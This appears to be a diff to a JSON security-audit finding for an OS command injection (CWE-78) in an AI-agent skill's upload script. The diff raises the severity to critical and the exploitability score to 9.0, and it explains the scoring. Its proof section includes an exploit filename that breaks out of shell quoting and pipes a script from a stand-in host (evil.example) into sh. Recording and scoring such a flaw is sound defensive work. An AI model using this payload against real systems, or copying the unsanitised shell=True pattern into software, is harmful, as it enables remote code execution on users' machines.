@@ -8,12 +8,12 @@
   "cwe_id": "CWE-78",
   "cwe_name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
   "owasp_category": "A03:2021 - Injection",
-  "tags": ["command-injection", "ai-agent-skill", "subprocess", "shell-true", "cwe-78"],
+  "tags": ["command-injection", "ai-agent-skill", "subprocess", "shell-true", "cwe-78", "externally_reachable"],
   "verdict": "confirmed",
   "evidence_level": 5,
-  "rationale": "Static data-flow analysis confirms the attacker-controlled Z-Library filename (download.suggested_filename) reaches seven subprocess.run(..., shell=True) sinks in scripts/upload.py without sanitisation. The single quotes wrapping the interpolated values in the f-strings are not a defence: a single-quote inside the filename closes the quoting and lets following shell metacharacters execute. Verdict CONFIRMED at evidence level 5 (EXPLOIT_SCENARIO_VALIDATED) - a concrete exploit input is demonstrated and the source-to-sink path is verified; it is not level 6 (FULL_EXPLOIT) because no live PoC was executed against a victim host.",
-  "severity": "high",
-  "exploitability_score": 3.0,
+  "rationale": "Static data-flow analysis confirms the attacker-controlled Z-Library filename (download.suggested_filename) reaches seven subprocess.run(..., shell=True) sinks in scripts/upload.py without sanitisation. The single quotes wrapping the interpolated values in the f-strings are not a defence: a single-quote inside the filename closes the quoting and lets following shell metacharacters execute. Verdict CONFIRMED at evidence level 5 (EXPLOIT_SCENARIO_VALIDATED) - a concrete exploit input is demonstrated and the source-to-sink path is verified; it is not level 6 (FULL_EXPLOIT) because no live PoC was executed against a victim host. Severity is CRITICAL per SEC-AF's CWE-78 RCE floor (sec_af.scoring.apply_cwe_severity_floor). The stored exploitability_score matches what sec_af.scoring.compute_exploitability_score produces for this finding: critical (10.0) x EXPLOIT_SCENARIO_VALIDATED evidence (0.9) x external reachability (1.0, the taint source is a remote attacker-controlled filename, tagged externally_reachable) x no-chain (1.0) = 9.0; sarif_security_severity mirrors it.",
+  "severity": "critical",
+  "exploitability_score": 9.0,
   "proof": {
     "exploit_hypothesis": "An attacker uploads a book to Z-Library named:  '; curl https://evil.example/x.sh | sh; '.epub  . The leading single-quote closes the quoting in the f-string, the `;` terminates the intended command, and the injected `curl | sh` runs with the privileges of the user running the skill. When the victim runs the skill on that book (the skill auto-downloads and processes it), the agent shells out via /bin/sh -c and the payload executes -> remote code execution. The wrapping single-quotes in the f-strings are not a defence: a `'` in the filename escapes them.",
     "verification_method": "Static source-to-sink taint tracing over scripts/upload.py: the tainted filename is followed from download.suggested_filename through the saved download path into seven f-string-built commands executed with shell=True. No dynamic exploit was run against a live host (no DAST / no PoC execution), hence evidence level 5 rather than 6.",
@@ -56,7 +56,7 @@
     "confidence": "high"
   },
   "sarif_rule_id": "sec-af/python/os-command-injection-shell-true",
-  "sarif_security_severity": 8.8,
+  "sarif_security_severity": 9.0,
   "references": [
     "https://cwe.mitre.org/data/definitions/78.html",
     "https://owasp.org/Top10/A03_2021-Injection/",
